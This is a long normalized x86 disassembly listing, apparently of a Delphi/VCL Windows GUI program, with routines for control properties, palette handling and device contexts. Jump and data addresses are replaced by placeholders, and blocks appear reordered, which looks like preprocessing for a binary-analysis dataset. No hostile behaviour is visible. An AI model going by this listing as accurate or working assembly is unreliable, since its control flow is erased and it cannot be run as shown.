mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43c8b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43ca6c
call sub_403aa4
call sub_403aa4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139c8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d4c4
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43c8ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413d34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43c98a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c991
mov eax [ rw-data ]
call sub_413d98
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43c962
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43ca6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d520
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4139c8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d4c4
test al al
je r-xdata
sub_43c998
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_43ca6c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41d074
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_43c9c4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d6a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41d6a8
mov eax [ ebp - 0x4 ]
call sub_43cab8
mov eax [ rw-data ]
call sub_413d34
mov ebx eax
xor eax eax
push ebp
push sub_43ca49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413d98
retn
call sub_43c830
sub_43ca6c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d6a8
mov edx ebx
mov eax [ rw-data ]
call sub_413d48
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43cab8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43e520
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43cae4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43cb20
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414068
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43cb68
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43cc24
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ccf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ccf8
lea eax [ ebp - 0x1c ]
call sub_403fbc
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403468
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44d8fc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b94
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_404010
sub_43cd14
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43cd7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44a510
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43dec4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov edx [ eax + 0x64 ]
pop eax
call sub_4043c8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cd82
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov al 0x1
sub_43cd88
push ebx
mov ebx eax
mov eax ebx
call sub_44a538
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43cdbc
push ebx
mov ebx eax
mov eax ebx
call sub_44a588
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4043c8
je r-xdata
mov al 0x1
pop ebx
retn
sub_43cdf4
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ce28
push ebx
mov ebx eax
mov eax ebx
call sub_419c70
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43ce50
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43def4
sub_43ce70
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43ce90
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_404010
sub_43ceb4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43dde4
sub_43ced4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43cf00
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4043c8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43cf64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43d840
sub_43cf84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43d82c
sub_43cfa4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43cfc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419380
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c4c0
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43df74
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43cae4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43ee84
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43d09c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035f8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45d788
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035e0
push edi
xor ecx ecx
mov edx 0xb039
call sub_43f0c4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43d864
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403468
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_40326c
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_40326c
mov eax [ edi + 0x68 ]
call sub_40326c
mov eax [ edi + 0x64 ]
call sub_408704
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4193cc
test bl bl
jle r-xdata
sub_43d168
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43d190
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403468
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d218
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43d518
sub_43d238
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_40326c
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43fee0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403468
mov edx ebx
mov eax edi
call sub_419450
mov eax ebx
mov si 0xffd9
call sub_403468
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43d300
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4197e0
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43f0c4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43f0c4
sub_43d394
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41969c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43de7c
jmp r-xdata
xor edx edx
mov eax esi
call sub_43d238
sub_43d3d8
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403468
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43d218
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403468
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43d480
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43f654
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e30c
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43d518
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43f0c4
mov eax ebx
mov si 0xffd0
call sub_403468
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403468
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43d518
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_4449fc
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43d634
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43d658
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43d680
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43d6a4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43d6c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43d7c3
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403468
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d7ca
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413b0c
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403468
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403468
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_41386c
sub_43d7d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43e30c
mov edx edi
mov eax ebx
call sub_43d884
mov edx edi
mov eax ebx
call sub_43f168
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43d840
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_404010
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43d884
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43d8e0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d90c
mov edx eax
mov ecx esp
mov eax esi
call sub_41256c
mov edx esp
mov eax ebx
call sub_43dd50
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43d924
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43d8c8
mov ecx esp
mov edx esi
call sub_41256c
mov edx esp
mov eax ebx
call sub_43dd50
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43d94c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43d9cd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d9d4
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
sub_43d9dc
push ebx
push esi
